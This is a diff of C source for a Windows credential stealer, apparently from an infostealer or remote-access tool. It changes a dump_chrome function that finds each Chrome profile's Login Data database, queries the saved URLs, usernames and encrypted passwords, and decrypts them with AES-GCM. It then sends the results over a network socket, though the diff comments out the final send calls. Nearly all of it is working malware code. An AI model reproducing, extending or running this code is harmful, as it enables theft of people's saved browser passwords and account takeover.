@@ -101,13 +101,33 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 	/* Go through the files/folders in that directory */
 	do {
 		if (checkSubtring("Default", dir_files.cFileName) || checkSubtring("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
-
 			sprintf_s(message, message_size * sizeof(CHAR), "------------------------ %s ---------------------\n", dir_files.cFileName);
 			Debug(send_data(message, ConnectSocket);)
 
-				/* Open database connection */
-				void* handle_db;																		// Handle to SQLite Database handle
-			if (!open_database(chrome_dir_char, dir_files.cFileName, &handle_db, message, message_size)) {
+			/* Append LoginData database path for each profile */
+			errno_t err;
+			CHAR logindata_path[MAX_PATH] = "\0";
+			if ((err = strcat_s(logindata_path, MAX_PATH, chrome_dir_char)) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
+				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending chrome_dir_char to logindata_path error: %d\n", err);)
+				return FALSE;
+			}
+			if ((err = strcat_s(logindata_path, MAX_PATH, dir_files.cFileName)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
+				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending '%s' to logindata_path error: %d\n", dir_files.cFileName, err);)
+				return FALSE;
+			}
+			if ((err = strcat_s(logindata_path, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
+				Debug(sprintf_s(message, message_size * sizeof(CHAR), "strcat_s: Appending 'Login Data' to logindata_path error: %d\n", err);)
+				return FALSE;
+			}
+
+			/* Open database connection */
+			void* handle_db;																		// Handle to SQLite Database handle
+			BOOL database_con_status = open_database(logindata_path, &handle_db, message, message_size, FALSE);
+			
+			/* Clears the appended '\' + Profile Name + '\Login Data' from the chrome_dir_char to append the path for Login Data for the next user */
+			//memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
+			
+			if (!database_con_status) {
 				Debug(send_data(message, ConnectSocket);)
 				continue;
 			}
@@ -116,7 +136,6 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 			void* handle_sql_stmt = NULL;															// Handle to SQLite Query Statement
 			if (!prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size)) {
 				Debug(send_data(message, ConnectSocket);)
-				memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
 				continue;
 			}
 
@@ -126,14 +145,14 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 
 				/* Get and send url and username */
 				sprintf_s(message, message_size * sizeof(CHAR), "URL: %s\nUsername: %s\n", (char*)get_result(handle_sql_stmt, 0, TEXT_RESULT), (char*)get_result(handle_sql_stmt, 1, TEXT_RESULT));
-				send_data(message, ConnectSocket);
+				//send_data(message, ConnectSocket);
 
 				/* Get, Decrypt, and send the password */
 				BYTE* data_blob = (BYTE*)get_result(handle_sql_stmt, 2, BYTE_RESULT);
 				int data_blob_size = get_result_size(handle_sql_stmt, 2);
 				if (aesgcm_decrypt(handle_bcrypt, 3, data_blob + 3 + 12, &data_blob_size, data_blob + 3, 12, data_blob + (data_blob_size - 16), 16, &decrypted_credential, &decrypted_credential_size)) {
 					sprintf_s(message, message_size * sizeof(CHAR), "Password: %s\n\n", decrypted_credential);
-					send_data(message, ConnectSocket);
+					//send_data(message, ConnectSocket);
 				}
 				else {
 					Debug(sprintf_s(message, message_size * sizeof(CHAR), "Decryption error\n");)
@@ -148,8 +167,6 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 				Debug(send_data(message, ConnectSocket);)
 			}
 
-			/* Clears the appended '\' + Profile Name + '\Login Data' from the chrome_dir_char to append the path for Login Data for the next user */
-			memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
 		}
 	} while (FindNextFileA(dir_handle, &dir_files));
 
